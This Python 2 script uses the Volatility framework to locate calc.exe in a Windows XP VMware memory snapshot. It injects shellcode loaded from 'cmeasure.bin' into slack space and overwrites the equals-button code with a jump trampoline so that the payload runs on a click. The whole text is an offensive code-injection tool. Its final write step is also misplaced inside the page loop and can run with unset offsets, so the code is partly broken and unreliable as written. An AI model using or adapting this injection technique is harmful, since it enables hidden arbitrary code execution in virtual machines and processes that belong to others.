import sys
import struct

import volatility.conf as conf
import volatility.registry as registry
import volatility.commands as commands
import volatility.addrspace as addrspace
import volatility.plugins.taskmods as taskmods

equalButton = 0x01005D51

memFile = "WinXPSP2.vmem"
slackSpace = None
trampOnlineOffset = None

scFD = open("cmeasure.bin", "rb")
sc = scFD.read()
scFD.close()

sys.path.append("")

registry.PluginImporter()
config = conf.ConfObject()

registry.registry_global_options(config, commands.Command)
registry.registry_global_options(config, addrspace.BaseAddressSpace)

config.parse_options()
config.PROFILE = "Win2003SP2x86"
config.LOCATION = "file://%s" % memFile

p = taskmods.PSList(config)

for process in p.calculate():
    if str(process.ImageFileName) == "calc.exe":
        print "[*] Found calc.exe with PID %d" % process.UniqueProcessId
        print "[*] Hunting for physical offsets...please wait."

        addressSpace = process.get_process_address_space()
        pages = addressSpace.get_available_pages()

        for page in pages:
            physical = addressSpace.vtop(page[0])

            if physical is not None:
                if slackSpace is None:

                    fd = open(memFile, "r+")
                    fd.seek(physical)
                    buf = fd.read(page[1])

                    try:
                        offset = buf.index("\x00" * len(sc))
                        slackSpace = page[0] + offset

                        print "[*] Found good shellcode location!"
                        print "[*] Virtual address: 0x%08x" % slackSpace
                        print "[*] Physical address: 0x%08x" % (physical + offset)
                        print "[*] Injecting shellcode."

                        fd.seek(physical + offset)
                        fd.write(sc)
                        fd.flush()

                        tramp = "\xbb%s" % struct.pack("<L", page[0] + offset)
                        tramp += "\xff\xe3"

                        if trampOnlineOffset is not None:
                            break

                    except:
                        pass

                    fd.close()

                    if page[0] <= equalButton and equalButton < ((page[0] + page[1]) - 7):
                        vOffset = equalButton - page[0]
                        trampOnlineOffset = physical + vOffset

                        print "[*] Found our tramponline target at: 0x%08x" % (trampOnlineOffset)

                        if slackSpace is not None:
                            break

            print "[*] Writing tramponline..."

            fd = open(memFile, "r+")
            fd.seek(trampOnlineOffset)
            fd.write(tramp)
            fd.close()
